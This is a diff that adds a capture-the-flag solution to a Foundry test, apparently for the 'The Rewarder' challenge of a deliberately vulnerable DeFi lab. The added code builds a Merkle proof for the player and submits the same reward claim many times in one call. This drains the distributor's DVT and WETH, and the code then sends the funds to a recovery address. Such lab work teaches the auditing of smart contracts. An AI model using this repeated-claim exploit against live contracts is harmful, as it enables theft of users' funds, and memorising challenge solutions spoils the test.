@@ -148,7 +148,42 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 playerIndex = 188;
+        uint256 playerDvtAmount = 11524763827831882;
+        uint256 playerWethAmount = 1171088749244340;
+
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, playerIndex);
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, playerIndex);
+
+        IERC20[] memory dvtToken = new IERC20[](1);
+        dvtToken[0] = IERC20(address(dvt));
+
+        uint256 dvtRepeats = distributor.getRemaining(address(dvt)) / playerDvtAmount;
+        Claim[] memory dvtClaims = new Claim[](dvtRepeats);
+
+        for (uint256 i = 0; i < dvtRepeats; i++) {
+            dvtClaims[i] = Claim({batchNumber: 0, amount: playerDvtAmount, tokenIndex: 0, proof: dvtProof});
+        }
+
+        distributor.claimRewards({inputClaims: dvtClaims, inputTokens: dvtToken});
+
+        IERC20[] memory wethToken = new IERC20[](1);
+        wethToken[0] = IERC20(address(weth));
+
+        uint256 wethRepeats = distributor.getRemaining(address(weth)) / playerWethAmount;
+        Claim[] memory wethClaims = new Claim[](wethRepeats);
+
+        for (uint256 i = 0; i < wethRepeats; i++) {
+            wethClaims[i] = Claim({batchNumber: 0, amount: playerWethAmount, tokenIndex: 0, proof: wethProof});
+        }
+
+        distributor.claimRewards({inputClaims: wethClaims, inputTokens: wethToken});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
